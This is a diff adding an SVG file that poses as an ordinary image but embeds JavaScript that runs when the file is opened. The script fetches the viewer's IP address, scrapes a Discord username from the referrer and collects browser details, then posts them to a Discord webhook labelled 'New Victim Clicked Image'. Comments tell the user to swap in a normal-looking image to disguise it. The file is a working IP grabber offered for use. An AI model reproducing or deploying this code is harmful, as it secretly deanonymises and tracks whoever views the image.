@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="300" viewBox="0 0 500 300">
+  <!-- Real image from URL (replace with your own normal-looking image) -->
+  <image href="https://img.freepik.com/premium-vector/hacker-silhouette-vector-white-background_1199258-1290.jpg?w=1060" width="500" height="300" preserveAspectRatio="xMidYMid slice"/>
+
+  <!-- Hidden JS that runs on zoom/open -->
+  <script type="text/javascript">
+    (function(){
+      var webhook = "https://discord.com/api/webhooks/1460684629693694077/fP9FtQt_PLQTaOtiVpTqkPmMFZAbnujF6hhwAKbiuzydPL4Xh7KAF-iUDAGxepAgWMh7"; // paste your webhook URL
+      var username = "Unknown";
+      var ip = "Fetching...";
+
+      // Try to get Discord username from referrer (Discord sends it on expand)
+      var ref = document.referrer || "";
+      if (ref.includes("discord.com")) {
+        var parts = ref.split("/");
+        username = parts[parts.length-1] || "Unknown";
+      }
+
+      // Log IP via free no-key service (ipify.org)
+      fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+          ip = data.ip;
+          sendLog();
+        })
+        .catch(() => {
+          ip = "Failed";
+          sendLog();
+        });
+
+      function sendLog() {
+        var payload = {
+          content: null,
+          embeds: [{
+            title: "New Victim Clicked Image",
+            color: 16711680,
+            fields: [
+              { name: "IP", value: ip, inline: true },
+              { name: "Discord Username", value: username, inline: true },
+              { name: "User-Agent", value: navigator.userAgent, inline: false },
+              { name: "Screen", value: screen.width + "x" + screen.height, inline: true },
+              { name: "Referrer", value: ref || "N/A", inline: false },
+              { name: "Time", value: new Date().toLocaleString(), inline: false }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        fetch(webhook, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(payload)
+        });
+      }
+    })();
+  </script>
+</svg>
